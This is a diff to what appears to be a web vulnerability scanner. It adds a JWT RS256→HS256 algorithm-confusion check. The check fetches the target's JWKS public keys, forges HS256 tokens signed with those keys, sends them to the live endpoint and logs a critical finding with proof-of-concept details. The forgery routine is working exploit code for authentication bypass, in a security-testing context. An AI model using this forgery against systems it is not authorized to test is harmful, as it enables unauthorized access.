@@ -26,6 +26,7 @@ import hmac
 import json
 import re
 from typing import TYPE_CHECKING
+from urllib.parse import urlparse
 
 if TYPE_CHECKING:
     from core.orchestrator import Context
@@ -85,6 +86,61 @@ def _tamper_claims(header: dict, payload: dict) -> tuple[dict, str]:
     return elevated, f"{head_b}.{body_b}.invalidsig"
 
 
+def _rsa_pem_from_jwk(n_b64: str, e_b64: str) -> str | None:
+    """Build a PEM public key from JWKS RSA (n, e) for the RS256→HS256
+    algorithm-confusion attack (the PEM bytes are used as the HMAC secret)."""
+    try:
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        from cryptography.hazmat.primitives import serialization
+        n = int.from_bytes(_b64u_dec(n_b64), "big")
+        e = int.from_bytes(_b64u_dec(e_b64), "big")
+        pub = rsa.RSAPublicNumbers(e, n).public_key()
+        return pub.public_bytes(
+            serialization.Encoding.PEM,
+            serialization.PublicFormat.SubjectPublicKeyInfo,
+        ).decode()
+    except Exception:
+        return None
+
+
+def _hs256_with_secret(header: dict, payload: dict, secret: str) -> str:
+    h = dict(header); h["alg"] = "HS256"
+    head = _b64u_enc(json.dumps(h, separators=(",", ":")).encode())
+    body = _b64u_enc(json.dumps(payload, separators=(",", ":")).encode())
+    sig = hmac.new(secret.encode(), f"{head}.{body}".encode(), hashlib.sha256).digest()
+    return f"{head}.{body}.{_b64u_enc(sig)}"
+
+
+async def _fetch_jwks(ctx: "Context", base: str) -> list[str]:
+    """Fetch RSA public keys (as PEM) from the standard JWKS location."""
+    from urllib.parse import urljoin
+    for path in ("/.well-known/jwks.json", "/.well-known/openid-configuration/jwks"):
+        ev = await ctx.http.get(urljoin(base, path))
+        if ev.status != 200:
+            continue
+        try:
+            doc = json.loads(ev.response_body or "{}")
+        except Exception:
+            continue
+        if "jwks_uri" in doc:
+            ev = await ctx.http.get(doc["jwks_uri"])
+            if ev.status != 200:
+                continue
+            try:
+                doc = json.loads(ev.response_body or "{}")
+            except Exception:
+                continue
+        pems = []
+        for k in (doc.get("keys") or []):
+            if k.get("kty") == "RSA" and k.get("n") and k.get("e"):
+                pem = _rsa_pem_from_jwk(k["n"], k["e"])
+                if pem:
+                    pems.append(pem)
+        if pems:
+            return pems
+    return []
+
+
 async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
     findings: list[dict] = []
     # locate the token in the live response — cookies + body
@@ -111,6 +167,44 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
         if not decomposed:
             continue
         header, payload, _ = decomposed
+
+        # RS256→HS256 algorithm confusion: sign with the PUBLIC key as an
+        # HMAC secret (the classic JWT confusion attack) when JWKS is exposed
+        if (header.get("alg") or "").upper() in ("RS256", "RS384", "RS512"):
+            base = urlparse(url)
+            pems = await _fetch_jwks(ctx, f"{base.scheme}://{base.netloc}")
+            for pem in pems[:3]:
+                conf_token = _hs256_with_secret(header, payload, pem)
+                ev_c = await ctx.http.get(
+                    url, headers={"Authorization": f"Bearer {conf_token}"},
+                )
+                if ev_c.status == 200 and len(ev_c.response_body or "") > 200 \
+                        and (anon_status in (401, 403) or anon_size < 200):
+                    from core.poc import proof_record
+                    poc = proof_record(
+                        verified=True, method="GET", url=url,
+                        request=f"GET {url}\nAuthorization: Bearer {conf_token[:120]}…",
+                        status=ev_c.status, excerpt=ev_c.response_body,
+                        rationale=("A token signed with HS256 using the server's OWN public "
+                                   "key (fetched from JWKS) as the HMAC secret was accepted — "
+                                   "the verifier trusts the attacker-controlled `alg` header "
+                                   "(RS256→HS256 confusion, full signature forgery)."))
+                    findings.append({
+                        "category": "api",
+                        "title": "JWT algorithm confusion — RS256→HS256 public-key forgery accepted",
+                        "severity": "critical", "cvss": 9.8,
+                        "url": url, "parameter": "Authorization",
+                        "payload": conf_token[:120] + "…",
+                        "evidence": "A forged HS256 token signed with the server's public key "
+                                    f"returned 200 ({len(ev_c.response_body or '')}B) while the "
+                                    f"anonymous request returned {anon_status}/{anon_size} — "
+                                    "attacker-controlled alg header enables signature forgery.",
+                        "request": f"GET {url}\nAuthorization: Bearer {conf_token[:120]}…",
+                        "response": (ev_c.response_body or "")[:1500],
+                        "metadata": {"forgery": "rs256_hs256_confusion",
+                                     "poc": poc},
+                    })
+                    break
 
         forged_variants = [
             ("alg=none",        _none_alg(header, payload)),
